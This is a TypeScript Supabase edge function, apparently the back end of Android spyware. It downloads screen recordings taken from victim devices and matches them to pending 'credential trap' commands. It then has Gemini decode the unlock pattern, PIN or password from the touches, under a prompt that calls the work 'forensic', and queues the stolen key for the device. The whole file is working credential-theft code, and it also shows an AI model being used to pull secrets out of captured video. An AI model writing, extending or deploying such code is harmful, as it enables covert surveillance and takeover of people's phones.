import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import { encode as base64Encode } from "https://deno.land/std@0.145.0/encoding/base64.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response("ok", { headers: corsHeaders });
  }

  try {
    const payload = await req.json();
    console.log("[VISION_ENGINE] Incoming Webhook Payload:", JSON.stringify(payload));

    let file_path = "";
    let device_id = "";
    let command_id = null;

    // A. Parse native Supabase Database Webhook structure
    if (payload.record && payload.table === "objects") {
      file_path = payload.record.name; // e.g., "SM_G990B_12345/SCREEN_RECORD/vid_123.mp4"
      
      // Extract device folder name (which contains the device ID)
      const pathParts = file_path.split("/");
      device_id = pathParts[0]; 
      
      // Filter: We only want to process screen recordings
      if (!file_path.includes("SCREEN_RECORD") && !file_path.includes("vid_")) {
        console.log("[VISION_ENGINE] Ignored: Uploaded file is not an unlock video.");
        return new Response(JSON.stringify({ skipped: true }), { status: 200, headers: corsHeaders });
      }
    } 
    // B. Fallback to manual payload
    else {
      file_path = payload.file_path;
      device_id = payload.device_id;
      command_id = payload.command_id;
    }

    if (!file_path || !device_id) {
      throw new Error("Could not resolve 'file_path' or 'device_id'.");
    }

    const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
    const supabaseServiceKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
    const geminiApiKey = Deno.env.get("GEMINI_API_KEY");

    if (!geminiApiKey) throw new Error("Missing 'GEMINI_API_KEY' secret.");
    const supabase = createClient(supabaseUrl, supabaseServiceKey);

    // C. Autonomous Discovery: Find the latest pending command for this device
    if (!command_id) {
      console.log(`[VISION_ENGINE] Querying latest pending credential trap for device: ${device_id}`);
      const { data: cmdData } = await supabase
        .from("file_commands")
        .select("id")
        .eq("device_id", device_id)
        .eq("file_name", "CAPTURE_CREDENTIALS")
        .eq("status", "DEFERRED_EXECUTION") // Deferred trap
        .order("created_at", { ascending: false })
        .limit(1);

      if (cmdData && cmdData.length > 0) {
        command_id = cmdData[0].id;
        console.log(`[VISION_ENGINE] Matched target to Command ID: ${command_id}`);
      }
    }

    // D. Download video
    const { data: fileData, error: downloadError } = await supabase.storage
      .from("cortex-vault")
      .download(file_path);

    if (downloadError || !fileData) {
      throw new Error(`Storage download failed: ${downloadError?.message}`);
    }

    const arrayBuffer = await fileData.arrayBuffer();
    const uint8Array = new Uint8Array(arrayBuffer);
    const base64Video = base64Encode(uint8Array);

    const systemPrompt = `You are a forensic video analysis tool specialized in security pattern and password extraction from Android screen recordings.
Observe the screen recording. Track touch indicators to decode the pattern or PIN/password.
- Pattern dots are laid out 1-9:
  [1, 2, 3]
  [4, 5, 6]
  [7, 8, 9]
Return ONLY a raw JSON object:
{
  "success": true | false,
  "type": "PATTERN" | "PIN" | "PASSWORD" | "UNKNOWN",
  "key": [1,2,5,8] | "1234" | null,
  "confidence": 0.0 to 1.0,
  "error": "Reason if success is false"
}`;

    const geminiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-3.1-flash-lite:generateContent?key=${geminiApiKey}`;
    const response = await fetch(geminiUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        contents: [
          {
            parts: [
              { inlineData: { mimeType: "video/mp4", data: base64Video } },
              { text: systemPrompt }
            ]
          }
        ],
        generationConfig: { responseMimeType: "application/json" }
      })
    });

    if (!response.ok) throw new Error(`Gemini Error: ${await response.text()}`);

    const resultJson = await response.json();
    const rawText = resultJson.candidates?.[0]?.content?.parts?.[0]?.text;
    if (!rawText) throw new Error("Gemini returned empty text.");

    const geminiResult = JSON.parse(rawText.trim());
    console.log("[VISION_ENGINE] Gemini Output:", JSON.stringify(geminiResult));

    // E. Save results & broadcast STORE_KEY
    if (geminiResult.success && geminiResult.key) {
      const keyString = typeof geminiResult.key === "object" ? JSON.stringify(geminiResult.key) : String(geminiResult.key);
      
      await supabase.from("file_commands").insert([
        { device_id, file_name: "STORE_KEY", content: `${geminiResult.type} | ${keyString}`, status: "PENDING" }
      ]);
      console.log(`[VISION_ENGINE] Key broadcast complete.`);

      if (command_id) {
        await supabase.from("file_commands").update({ status: "RECOVERY_SUCCESS", result_data: geminiResult }).eq("id", command_id);
      }
    } else {
      if (command_id) {
        await supabase.from("file_commands").update({ status: "RECOVERY_FAILED", error_log: geminiResult.error || "Failed analysis" }).eq("id", command_id);
      }
    }

    return new Response(JSON.stringify(geminiResult), { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } });

  } catch (err) {
    console.error("[VISION_ENGINE_ERR]", err.message);
    return new Response(JSON.stringify({ error: err.message }), { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } });
  }
});